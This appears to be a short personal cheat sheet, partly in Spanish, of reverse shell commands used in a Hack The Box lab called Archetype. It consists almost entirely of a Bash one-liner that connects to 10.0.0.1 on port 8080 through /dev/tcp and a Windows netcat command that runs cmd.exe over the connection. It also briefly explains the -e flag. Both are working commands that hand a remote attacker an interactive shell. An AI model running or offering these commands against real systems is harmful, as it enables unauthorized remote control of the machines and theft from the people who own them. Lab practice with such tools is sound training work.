
# Linux

## Bash

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

# Windows

## nc64.exe

Utilizando el binario de netcat para windows x64 podemos mandarnos una reverse shell. Se utiliza en [[Archetype HTB]].

```powershell
.\nc64.exe -e cmd.exe <ip> <port>
```

Con el parámetro `-e` indicamos que queremos ejecutar un archivo al conectarnos, en este caso una cmd.